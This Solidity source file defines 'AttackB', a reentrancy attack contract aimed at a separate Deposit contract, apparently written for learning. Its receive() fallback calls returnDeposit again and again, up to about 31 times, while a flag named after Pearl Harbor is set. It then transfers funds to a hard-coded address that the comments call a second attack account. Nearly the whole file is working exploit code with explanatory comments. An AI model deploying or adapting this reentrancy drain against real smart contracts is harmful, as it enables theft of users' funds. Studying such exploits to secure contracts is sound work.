// SPDX-License-Identifier: MIT
pragma solidity >=0.6.6;

/*
interface Deposit{
       function returnDeposit(uint256 amountOut) external returns (bool);
   }
   */
// You either have to define an Interface or use Import to import the code if you have it
import "./deposit.sol";

contract AttackB{
    // Need to define a variable of type Deposit
    Deposit deposit;
    // variable named after the attack on pearl harbour
    bool ToraTora;
    //Global variable mutex to stop recursion
    uint mutex;

// Now define a constructor function to take the address of the deployed Deposit contract
    constructor(address payable _deposit) public {
        deposit = Deposit(_deposit);
    }



    function executeAttack (bool _foo) public {
        ToraTora = _foo;
    }
    function sendDeposit (uint256 amountIn) public returns (bool){
        deposit.receiveDeposit(amountIn);
        return true;
// call deposit contract and deposit some Ether
    }

    function withDraw(uint amount) public returns (bool){
        // call deposit contract to withdraw ether
        deposit.returnDeposit(amount);
        return true;
    }

    function getAttackAddress() public view returns (address ){
        return address(this);
    }

    function getDepositAddress() public view returns (address ){
        return address(deposit);
    }

    receive() external payable {
        // call back
        // So if ToraTora is true Attack by calling returnDeposit again
        // if (mutex check how many times its been called attacker seems to have used 30, check wether to attack, 
        // otherwise any msg to this contract will cause it to attack)
        uint256 amount = 258;
        // So this line stops the attack after 31 iterations
        // You need too reset the ToraTora variable, so that the attack can continue 
        if (mutex > 31){
            // reset mutex
            mutex = 0;
            // set Attack flag back to false
             ToraTora = false;
            // Transfer balance to the other attack account attackA

             deposit.transfer(address(0x254dffcd3277C0b1660F6d42EFbB754edaBAbC2B),amount);
             }
        if (ToraTora) 
        {
            mutex += 1;
            deposit.returnDeposit(amount);
        }
    
  }
    
}
